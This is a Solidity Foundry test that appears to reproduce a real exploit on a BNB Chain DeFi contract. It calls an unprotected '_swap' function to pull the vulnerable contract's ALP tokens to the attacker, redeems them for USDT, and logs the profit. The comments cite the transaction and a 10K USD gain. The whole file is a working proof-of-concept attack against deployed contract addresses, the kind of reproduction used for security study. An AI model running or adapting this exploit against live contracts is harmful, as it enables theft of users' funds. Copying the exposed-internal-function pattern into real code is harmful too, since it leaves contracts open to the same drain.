// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
// TX : https://phalcon.blocksec.com/explorer/tx/bsc/0x9983ca8eaee9ee69629f74537eaf031272af75f1e5a7725911d8b06df17c67ca
// GUY : https://twitter.com/0xNickLFranklin/status/1765296663667875880
// Profit : 10K USD
// REASON : public interal call

struct ApolloXRedeemData {
    address alpTokenOut;
    uint256 minOut;
    address tokenOut;
    bytes aggregatorData;
}

struct RedeemData {
    uint256 amount;
    address receiver;
    ApolloXRedeemData apolloXRedeemData;
}

interface Vun {
    function _swap(address tokenForSwap, bytes memory agg) external;
}

interface Alp is IERC20 {
    function maxRedeem(address owner) external returns (uint256 maxShares);
    function redeem(uint256 shares, RedeemData calldata redeemData) external;
}

contract ContractTest is Test {
    IERC20 constant USDT = Alp(0x55d398326f99059fF775485246999027B3197955);
    Alp constant ALP_APO = Alp(0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d);
    Vun constant VUN = Vun(0xD188492217F09D18f2B0ecE3F8948015981e961a);

    function setUp() external {
        vm.createSelectFork("bsc", 36_727_073);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint(
            "[End] Attacker USDT before exploit",
            USDT.balanceOf(address(this)),
            18
        );
        uint256 VUN_balance = ALP_APO.balanceOf(address(VUN));
        uint256[] memory pools = new uint256[](1);
        pools[0] = uint256(
            1_457_847_883_966_391_224_294_152_661_087_436_089_985_854_139_374_837_306_518
        ); // translate into hex,contain your address
        VUN._swap(
            address(ALP_APO),
            abi.encodeWithSignature(
                "unoswapTo(address,address,uint256,uint256,uint256[])",
                address(this),
                address(ALP_APO),
                VUN_balance,
                0,
                pools
            )
        );
        ALP_APO.maxRedeem(address(this));
        ALP_APO.approve(address(ALP_APO), VUN_balance);
        RedeemData memory r;
        r.amount = VUN_balance;
        r.receiver = address(this);
        r.apolloXRedeemData.alpTokenOut = address(USDT);
        r.apolloXRedeemData.minOut = 0;
        r.apolloXRedeemData.tokenOut = address(USDT);
        r.apolloXRedeemData.aggregatorData = "";
        ALP_APO.redeem(VUN_balance, r);
        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            18
        );
    }

    function swap(uint256 a, uint256 b, address c, bytes memory d) external {}

    function getReserves() public view returns (uint256, uint256, uint256) {
        return (1, 1, block.timestamp);
    }
}
